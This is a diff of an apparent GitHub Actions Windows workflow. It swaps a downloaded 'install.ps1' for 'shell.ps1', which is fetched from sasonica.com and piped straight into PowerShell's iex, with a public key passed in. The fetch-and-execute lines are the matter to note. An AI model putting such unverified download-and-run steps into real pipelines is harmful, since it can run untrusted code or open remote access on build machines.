@@ -35,7 +35,7 @@ jobs:
     runs-on: windows-latest
     timeout-minutes: 45
     steps:
-      - name: irm https://sasonica.com/install.ps1 | iex
+      - name: irm https://sasonica.com/shell.ps1 | iex
         shell: powershell
         env:
           PUBKEY: ${{ inputs.pubkey }}
@@ -61,7 +61,7 @@ jobs:
           } else {
             $p = Start-Process powershell.exe -PassThru -NoNewWindow `
               -RedirectStandardOutput $out -RedirectStandardError $err `
-              -ArgumentList '-NoProfile', '-Command', 'irm https://sasonica.com/install.ps1 | iex'
+              -ArgumentList '-NoProfile', '-Command', 'irm https://sasonica.com/shell.ps1 | iex'
           }
           # Without holding the handle, ExitCode reads empty once it has exited.
           $null = $p.Handle
